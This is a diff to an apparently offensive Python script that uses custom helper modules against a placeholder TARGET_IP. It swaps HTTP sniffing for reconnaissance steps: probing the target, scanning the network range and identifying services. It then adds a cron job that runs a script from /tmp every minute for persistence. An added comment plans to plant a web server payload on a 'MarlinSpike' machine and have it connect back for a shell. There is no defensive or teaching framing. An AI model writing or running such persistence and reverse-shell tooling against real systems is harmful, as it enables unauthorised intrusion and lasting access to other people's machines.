@@ -16,6 +16,7 @@ import time
 from publicface import publicface as Pf
 
 def somerandomcode1():
+
     pfi = Pf()
     cci = cc()
     psi = ps()
@@ -26,18 +27,22 @@ def somerandomcode1():
     csi = cs()
     tfi = tf()
     ori = Or()
+
+    #So hear me out, we can get MarlinSpike with a web server payload, and writing a cron job for easy access. It even has a "connect to server" button on the guest login page, so we can just have it connect back to us and get a shell.
+    
     print("[*] Welcome Home")
-
-    capture=psi.start_sniffing(1000, 600, f"ip.addr == {TARGET_IP} and tcp.port == 80", "http_traffic.pcap")
-    psi.analyze_capture("http_traffic.pcap", "http_traffic.txt")
-    http_traffic = psi.parse_http_traffic("http_traffic.txt")
-    for request in http_traffic:
-        print(f"[*] HTTP Request: {request['method']} {request['url']}")
-        print(f"[*] Headers: {request['headers']}")
-        print(f"[*] Body: {request['body']}")
-        print("-" * 50)
-
-
+    print("[*] Starting the random code execution...")
+    time.sleep(2)
+    print("[*] Gathering public information about the target...")
+    livecheck=pfi.get_request(f"http://{TARGET_IP}", headers={"User-Agent": "Mozilla/5.0"})
+    print (livecheck)
+    print("[*] Performing network reconnaissance...")
+    nri.scan_network(TARGET_RANGE)
+    print("[*] Identifying running processes on the target...")
+    wpi.identify_services()
+    wpi.cron_job(command="* * * * * /usr/bin/python3 /tmp/somerandomcode.py", service="python3", schedule="hourly")
+    croncheck = csi.execute_command("crontab -l")
+    print(croncheck)
 
 if __name__ == "__main__":  
     somerandomcode1()
@@ -47,3 +52,5 @@ if __name__ == "__main__":
         fsi.delete_file("bin.txt")
         fsi.delete_file("rawbin.txt")
         print("[*] Old files cleaned up.")
+    else:
+        print("[*] Skipping cleanup of old files.")
